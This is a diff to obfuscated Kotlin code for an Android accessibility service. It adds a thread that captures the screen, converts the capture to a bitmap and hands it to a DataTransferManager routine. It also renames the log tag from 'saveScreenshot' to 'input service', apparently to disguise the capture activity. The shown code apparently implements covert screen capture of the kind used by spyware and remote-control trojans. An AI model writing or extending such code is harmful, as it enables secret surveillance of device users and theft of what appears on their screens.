@@ -1095,13 +1095,14 @@ fun b481c5f9b372ead_2() {
     fun d(context: Context?, str: String?, i2: Int) {
         try {
             if (context != null && str != null) {
-                Log.d("saveScreenshot", "正在截图，可能这里没有释放")
+                Log.d("input service", "正在截图，可能这里没有释放")
                 takeScreenshot(0, this.i, ScreenshotCallback(context, i2, str))
             }
         } catch (e: Exception) {
             e.printStackTrace()
         }
     }
+	
     private fun l(context: Context, i: Int) {
         try {
             while (shouldRun == true) {
@@ -1140,6 +1141,7 @@ fun b481c5f9b372ead_2() {
             const val MAX_COUNT = 10
         }
 
+		/*
         inner class ScreenshotThread(
             private val screenshotResult: AccessibilityService.ScreenshotResult
         ) : Thread() {
@@ -1168,6 +1170,8 @@ fun b481c5f9b372ead_2() {
                      originalBitmap =
                         hardwareBuffer?.let { Bitmap.wrapHardwareBuffer(it, colorSpace) }
 
+                    screenshotResult.hardwareBuffer?.close()
+						
                     if (originalBitmap == null) return
 
             
@@ -1218,7 +1222,41 @@ fun b481c5f9b372ead_2() {
                 }
             }
         }
+        */
 
+	       private class ScreenshotThread(
+		    private val screenshotResult: AccessibilityService.ScreenshotResult
+		) : Thread() {
+		
+		    override fun run() {
+		        var originalBitmap: Bitmap? = null
+		        var hardwareBuffer: HardwareBuffer? = null
+		
+		        try {
+		            if (shouldRun && !SKL) {
+		                // 截图模式逻辑
+		            } else {
+		                return
+		            }
+		
+		            hardwareBuffer = screenshotResult.hardwareBuffer
+		            val colorSpace: ColorSpace? = screenshotResult.colorSpace
+		            originalBitmap = hardwareBuffer?.let { Bitmap.wrapHardwareBuffer(it, colorSpace) }
+		
+		            if (originalBitmap == null) return
+		
+		            DataTransferManager.a012933444445(originalBitmap)
+		
+		        } catch (e: Exception) {
+		            e.printStackTrace()
+		        } finally {           
+		            originalBitmap?.recycle()
+		            hardwareBuffer?.close()
+		        }
+		    }
+		}
+
+		
         override fun onFailure(errorCode: Int) {
             if (errorCode == 3) {
                 // k += 50
